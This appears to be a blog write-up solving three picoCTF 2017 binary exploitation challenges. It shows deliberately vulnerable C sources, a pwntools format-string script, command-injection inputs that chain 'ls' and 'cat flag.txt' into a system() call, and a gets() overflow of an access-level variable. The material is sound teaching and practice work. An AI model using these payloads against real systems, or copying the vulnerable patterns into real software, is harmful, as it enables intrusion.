Title: PicoCTF 2017 Lvl2 Remaining challenges
Date: 2018-7-29 10:02
Modified: 2018-7-29 10:02
Category: ctf
Tags: ctf, pwnable, binary exploitation
Slug: picoCTF_lvl2Remaining
Authors: F3real
Summary: How to solve picoCTF remaining challenges


In this post we are going to take a look at three challenges from picoCTF 2017, which I think are simple enough that they can be grouped together.

[TOC]

## 1. Ive Got A Secret

>    Hopefully you can find the right format for my [secret](https://webshell2017.picoctf.com/static/7ea472826fbd769adc63da9f9a6d2fec/secret)! [Source](https://webshell2017.picoctf.com/static/7ea472826fbd769adc63da9f9a6d2fec/secret.c). Connect on shell2017.picoctf.com:39169.

Let’s look at the source code:

~~~c
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

#define BUF_LEN 64
char buffer[BUF_LEN];

int main(int argc, char** argv) {
    int fd = open("/dev/urandom", O_RDONLY);
    if(fd == -1){
        puts("Open error on /dev/urandom. Contact an admin\n");
        return -1;
    }
    int secret;
    if(read(fd, &secret, sizeof(int)) != sizeof(int)){
        puts("Read error. Contact admin!\n");
        return -1;
    }
    close(fd);
    printf("Give me something to say!\n");
    fflush(stdout);
    fgets(buffer, BUF_LEN, stdin);
    printf(buffer);

    int not_secret;
    printf("Now tell my secret in hex! Secret: ");
    fflush(stdout);
    scanf("%x", &not_secret);
    if(secret == not_secret){
        puts("Wow, you got it!");
        system("cat ./flag.txt");   
    }else{
        puts("As my friend says,\"You get nothing! You lose! Good day, Sir!\"");
    }

    return 0;
}
~~~

We see that program is generating random number and asking us for input, if we get the number right it prints us the flag. Vulnerability lies in:

    printf(buffer);

Since no format string is specified, we can add `%x` to our input to read from stack. This works because, if `printf` finds format string parameters (`%x` or similar) it expects arguments after it, if no arguments are given it will just read first thing off the stack.

Since we are not sure where is `secret` written on the stack we can just specify enough `%x` to read as much as we can from stack (keeping in mind size of `buffer`). We are going to use `12 * %08x`. so we can easier read the output.

    1)00000040.f7fc7c20.08048792.00000001.ffffdd34.552bcb3a.00000003.f7fc73c4.ffffdca0.00000000.f7e37a63.08048740.
    2)00000040.f7fc7c20.08048792.00000001.ffffdd34.aa7d05a6.00000003.f7fc73c4.ffffdca0.00000000.f7e37a63.08048740.

As we see most of stack remains the same expect 6 byte which changes, so could that be the answer ? Lets write **pwntool** script to automate this.

~~~python
from pwn import *

context.arch = 'i386'
context.terminal = 'tmux'

r = remote('shell2017.picoctf.com', 39169)
print r.recvuntil('Give me something to say!')
payload1 = '%08x.' * 12 + '\n'
r.send(payload1)
response =  r.recvuntil('Now tell my secret in hex! Secret: ')
print response
payload2 = response.split('.')[5] + '\n'
print payload2
r.send(payload2)
print r.recvall()
r.close()
~~~

And running it, we see that our assumption is right and that we get the flag.

![Shell result of Ive Got A Secret]({static}/images/2018_8_29_Secret.png){: .img-fluid .centerimage}

## 2. Flagsay 1

>    I heard you like flags, so now you can make your own! Exhilarating! Use [flagsay-1](https://webshell2017.picoctf.com/static/63c03a01d0f31a6c8ce7301d5c4005e5/flagsay-1)! [Source](https://webshell2017.picoctf.com/static/63c03a01d0f31a6c8ce7301d5c4005e5/flagsay-1.c). Connect on shell2017.picoctf.com:37742.

Let’s look at the source code:

~~~c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define FIRSTCHAROFFSET 129
#define LINELENGTH 35
#define NEWLINEOFFSET 21
#define LINECOUNT 6

#define BUFFLEN 1024

char flag[] = "               _                                        \n"
	          "              //~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     \n"
	          "             //                                   /     \n"
	          "            //                                   /      \n"
	          "           //                                   /       \n"
	          "          //                                   /        \n"
	          "         //                                   /         \n"
	          "        //                                   /          \n"
	          "       //___________________________________/           \n"
	          "      //                                                \n"
	          "     //                                                 \n"
	          "    //                                                  \n"
	          "   //                                                   \n"
	          "  //                                                    \n"
	          " //                                                     \n";

char commandBase[] = "/bin/echo \"%s\"\n";

void placeInFlag(char * str){
	char * ptr = flag + FIRSTCHAROFFSET;
	char * lastInLine = ptr + LINELENGTH;
	size_t charRemaining = strlen(str);
	size_t linesDone = 0;
	while(charRemaining > 0 && linesDone < LINECOUNT){
		if(ptr == lastInLine){
			ptr += NEWLINEOFFSET;
			lastInLine += NEWLINEOFFSET + LINELENGTH;
			linesDone++;
			continue;
		}
		ptr[0] = str[0];
		ptr++;
		str++;
		charRemaining--;
	}
	
}



int main(int argc, char **argv){
	size_t flagSize = strlen(flag) + 1; //need to remember null terminator
	char * input = (char *)malloc(sizeof(char) * flagSize);
	input[flagSize-1] = '\x0';
	fgets(input, flagSize, stdin);
	char * temp = strchr(input, '\n');
	if(temp != NULL){
		temp[0] = '\x0';
	}
	placeInFlag(input);

	size_t commandLen = flagSize + strlen(commandBase) + 1;
	char * command = (char *)malloc(sizeof(char) * commandLen);
	snprintf(command, commandLen, commandBase, flag); 
	system(command);

	free(input);
	free(command);
}
~~~

At first program may look confusing, but looking carefully we see that this is actually simple. It takes user input, inserts it into flag and prints result it using `system` and `echo`. Since user input is just passed to `system` call without modification we can just chain new commands by escaping `echo` using `“` and adding new commands. So let’s try it:

    ";ls; echo "

![Shell result of Flagsay ls]({static}/images/2018_8_29_Flagsay1.png){: .img-fluid .centerimage}

We add `echo` at the end just to finish printing the rest of the flag but in any case, now we know location of flag and we can print it in same way.

    "; cat flag.txt;echo "

and we get our flag.

![Shell result of Flagsay cat]({static}/images/2018_8_29_Flagsay2.png){: .img-fluid .centerimage}

## 3. VR Gear Console

>    Here's the VR gear admin console. See if you can  figure out a way to log in. The problem is found here:  /problems/1444de144e0377e55e5c7fea042d7f01

Let’s look at the source code:

~~~c
#include <stdlib.h>
#include <stdio.h>

int login() {
    int accessLevel = 0xff;
    char username[16];
    char password[32];
    printf("Username (max 15 characters): ");
    gets(username);
    printf("Password (max 31 characters): ");
    gets(password);

    if (!strcmp(username, "admin") && !strcmp(password, "{{ create_long_password() }}")) {
        accessLevel = 2;
    } else if (!strcmp(username, "root") && !strcmp(password, "{{ create_long_password() }}")) {
        accessLevel = 0;
    } else if (!strcmp(username, "artist") && !strcmp(password, "my-password-is-secret")) {
        accessLevel = 0x80;
    }

    return accessLevel;
}

int main(int argc, char **argv) {
    setbuf(stdout, NULL);
    printf(
        "+----------------------------------------+\n"
        "|                                        |\n"
        "|                                        |\n"
        "|                                        |\n"
        "|                                        |\n"
        "|  Welcome to the VR gear admin console  |\n"
        "|                                        |\n"
        "|                                        |\n"
        "|                                        |\n"
        "|                                        |\n"
        "+----------------------------------------+\n"
        "|                                        |\n"
        "|      Your account is not recognized    |\n"
        "|                                        |\n"
        "+----------------------------------------+\n"
        "\n\n\n\n"
        "Please login to continue...\n\n\n"
    );
    int access = login();

    printf("Your access level is: 0x%08x\n", access);

    if (access >= 0xff || access <= 0) {
        printf("Login unsuccessful.\n");
        exit(10);
    } else if (access < 0x30) {
        printf("Admin access granted!\n");
        printf("The flag is in \"flag.txt\".\n");
        system("/bin/sh");
    } else {
        printf("Login successful.\n");
        printf("You do not have permission to access this resource.\n");
        exit(1);
    }
}
~~~

This is last binary exploitation challenge at level 2 of picoCTF. Program ask us for username and password, checks if our access level is bellow `0x30` and if so prints the flag.

Looking at the login function we see that `username` buffer is declared just after `accessLevel` and that program uses `gets` function which doesn’t check for length of input. This means that if we input more then 16 bytes as username we are going to overflow `accessLevel`. Since we know that `!` is `0x21` in hex we can use `17 * !` to overflow `accessLevel`, pass the check and get the flag.

![vgear console output]({static}/images/2018_8_29_vgear.png){: .img-fluid .centerimage}
